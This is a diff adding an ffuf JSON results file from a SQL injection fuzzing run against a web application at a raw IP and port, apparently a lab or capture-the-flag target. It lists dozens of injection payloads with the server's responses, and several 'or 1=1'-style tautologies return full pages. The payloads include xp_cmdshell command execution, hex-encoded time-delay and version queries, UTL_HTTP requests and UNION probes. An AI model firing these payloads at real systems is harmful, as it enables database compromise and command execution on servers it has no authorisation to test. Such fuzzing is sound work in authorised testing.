+        "FFUFHASH": "6aaf3d5",
+        "FUZZ": "!"
+      },
+      "position": 213,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 190124167,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1!",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3d8",
+        "FUZZ": "declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)"
+      },
+      "position": 216,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 192712036,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3d9",
+        "FUZZ": "declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)"
+      },
+      "position": 217,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 194419294,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3da",
+        "FUZZ": "declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)"
+      },
+      "position": 218,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 131916272,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3e0",
+        "FUZZ": "'%20or%20''='"
+      },
+      "position": 224,
+      "status": 200,
+      "length": 2633,
+      "words": 723,
+      "lines": 53,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 120868704,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1'%20or%20''='",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3d7",
+        "FUZZ": " or a = a"
+      },
+      "position": 215,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 201271413,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or a = a",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3db",
+        "FUZZ": "declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)"
+      },
+      "position": 219,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 134531915,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3df",
+        "FUZZ": "'; exec master..xp_cmdshell 'ping 172.10.1.255'--"
+      },
+      "position": 223,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 128501330,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1'; exec master..xp_cmdshell 'ping 172.10.1.255'--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3dc",
+        "FUZZ": "' or 1=1"
+      },
+      "position": 220,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 130525584,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1' or 1=1",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3e1",
+        "FUZZ": "'%20or%20'x'='x"
+      },
+      "position": 225,
+      "status": 200,
+      "length": 2633,
+      "words": 723,
+      "lines": 53,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 122342189,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1'%20or%20'x'='x",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3e7",
+        "FUZZ": "' or '1'='1'--"
+      },
+      "position": 231,
+      "status": 200,
+      "length": 2633,
+      "words": 723,
+      "lines": 53,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 122036930,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1' or '1'='1'--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3e2",
+        "FUZZ": "')%20or%20('x'='x"
+      },
+      "position": 226,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 127176128,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1')%20or%20('x'='x",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3e6",
+        "FUZZ": "' or 1=1--"
+      },
+      "position": 230,
+      "status": 200,
+      "length": 2633,
+      "words": 723,
+      "lines": 53,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 122787623,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1' or 1=1--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3e3",
+        "FUZZ": "' or 0=0 --"
+      },
+      "position": 227,
+      "status": 200,
+      "length": 2633,
+      "words": 723,
+      "lines": 53,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 128331197,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1' or 0=0 --",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3e5",
+        "FUZZ": " or 0=0 #\""
+      },
+      "position": 229,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 128374661,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or 0=0 #\"",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3e9",
+        "FUZZ": "or 1=1--"
+      },
+      "position": 233,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 125711200,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1or 1=1--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3e4",
+        "FUZZ": "' or 0=0 #"
+      },
+      "position": 228,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 127479855,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1' or 0=0 #",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3e8",
+        "FUZZ": "' or 1 --'"
+      },
+      "position": 232,
+      "status": 200,
+      "length": 2633,
+      "words": 723,
+      "lines": 53,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 199815395,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1' or 1 --'",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3ed",
+        "FUZZ": " or a=a"
+      },
+      "position": 237,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 192407823,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or a=a",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3ea",
+        "FUZZ": "' or 1=1 or ''='"
+      },
+      "position": 234,
+      "status": 200,
+      "length": 2633,
+      "words": 723,
+      "lines": 53,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 198291179,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1' or 1=1 or ''='",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3eb",
+        "FUZZ": " or 1=1 or \"\"="
+      },
+      "position": 235,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 200630962,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or 1=1 or \"\"=",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3ec",
+        "FUZZ": "' or a=a--"
+      },
+      "position": 236,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 198194357,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1' or a=a--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3ef",
+        "FUZZ": "'hi' or 'x'='x';"
+      },
+      "position": 239,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 134127083,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1'hi' or 'x'='x';",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3f1",
+        "FUZZ": "procedure"
+      },
+      "position": 241,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 133056231,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1procedure",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3ee",
+        "FUZZ": "') or ('a'='a"
+      },
+      "position": 238,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 138593145,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1') or ('a'='a",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3f8",
+        "FUZZ": "'; exec master..xp_cmdshell"
+      },
+      "position": 248,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 130131523,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1'; exec master..xp_cmdshell",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3f0",
+        "FUZZ": "or"
+      },
+      "position": 240,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 139975031,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1or",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3f9",
+        "FUZZ": "'; exec xp_regread"
+      },
+      "position": 249,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 207165129,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1'; exec xp_regread",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3fa",
+        "FUZZ": "t'exec master..xp_cmdshell 'nslookup www.google.com'--"
+      },
+      "position": 250,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 207894396,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1t'exec master..xp_cmdshell 'nslookup www.google.com'--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3fb",
+        "FUZZ": "--sp_password"
+      },
+      "position": 251,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 210377407,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1--sp_password",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3f2",
+        "FUZZ": "handler"
+      },
+      "position": 242,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 215450669,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1handler",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3fd",
+        "FUZZ": "' UNION ALL SELECT"
+      },
+      "position": 253,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 209163687,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1' UNION ALL SELECT",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3fe",
+        "FUZZ": "' or (EXISTS)"
+      },
+      "position": 254,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 211729957,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1' or (EXISTS)",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3104",
+        "FUZZ": "'sqlattempt1"
+      },
+      "position": 260,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 211092760,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1'sqlattempt1",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3ff",
+        "FUZZ": "' (select top 1"
+      },
+      "position": 255,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 212702420,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1' (select top 1",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3fc",
+        "FUZZ": "' UNION SELECT"
+      },
+      "position": 252,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 215355773,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1' UNION SELECT",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3100",
+        "FUZZ": "'||UTL_HTTP.REQUEST"
+      },
+      "position": 256,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 212924114,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1'||UTL_HTTP.REQUEST",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3101",
+        "FUZZ": "1;SELECT%20*"
+      },
+      "position": 257,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 214893923,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/11;SELECT%20*",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3109",
+        "FUZZ": "' or ''='"
+      },
+      "position": 265,
+      "status": 200,
+      "length": 2633,
+      "words": 723,
+      "lines": 53,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 128326850,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1' or ''='",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3106",
+        "FUZZ": "%29"
+      },
+      "position": 262,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 139060702,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1%29",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3105",
+        "FUZZ": "%28"
+      },
+      "position": 261,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 212698243,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1%28",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3103",
+        "FUZZ": "'%20or%201=1"
+      },
+      "position": 259,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 215355147,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1'%20or%201=1",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3108",
+        "FUZZ": "%21"
+      },
+      "position": 264,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 136254522,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1%21",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3107",
+        "FUZZ": "%26"
+      },
+      "position": 263,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 139450728,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1%26",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf310a",
+        "FUZZ": "' or 3=3"
+      },
+      "position": 266,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 133734041,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1' or 3=3",
+      "host": "159.65.81.48:30373"
+    }
+  ],
+  "config": {
+    "autocalibration": false,
+    "autocalibration_keyword": "FUZZ",
+    "autocalibration_perhost": false,
+    "autocalibration_strategy": "basic",
+    "autocalibration_strings": [],
+    "colors": false,
+    "cmdline": "ffuf -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt:FUZZ -u http://159.65.81.48:30373/view/1FUZZ -o res.json",
+    "configfile": "",
+    "postdata": "",
+    "debuglog": "",
+    "delay": {
+      "value": "0.00"
+    },
+    "dirsearch_compatibility": false,
+    "extensions": [],
+    "fmode": "or",
+    "follow_redirects": false,
+    "headers": {},
+    "ignorebody": false,
+    "ignore_wordlist_comments": false,
+    "inputmode": "clusterbomb",
+    "cmd_inputnum": 100,
+    "inputproviders": [
+      {
+        "name": "wordlist",
+        "keyword": "FUZZ",
+        "value": "/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt",
+        "template": ""
+      }
+    ],
+    "inputshell": "",
+    "json": false,
+    "matchers": {
+      "IsCalibrated": false,
+      "Mutex": {},
+      "Matchers": {
+        "status": {
+          "value": "200,204,301,302,307,401,403,405,500"
+        }
+      },
+      "Filters": {},
+      "PerDomainFilters": {}
+    },
+    "mmode": "or",
+    "maxtime": 0,
+    "maxtime_job": 0,
+    "method": "GET",
+    "noninteractive": false,
+    "outputdirectory": "",
+    "outputfile": "res.json",
+    "outputformat": "json",
+    "OutputSkipEmptyFile": false,
+    "proxyurl": "",
+    "quiet": false,
+    "rate": 0,
+    "recursion": false,
+    "recursion_depth": 0,
+    "recursion_strategy": "default",
+    "replayproxyurl": "",
+    "requestfile": "",
+    "requestproto": "https",
+    "scraperfile": "",
+    "scrapers": "all",
+    "sni": "",
+    "stop_403": false,
+    "stop_all": false,
+    "stop_errors": false,
+    "threads": 40,
+    "timeout": 10,
+    "url": "http://159.65.81.48:30373/view/1FUZZ",
+    "verbose": false,
+    "wordlists": [
+      "/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt:FUZZ"
+    ],
+    "http2": false
+  }
+}
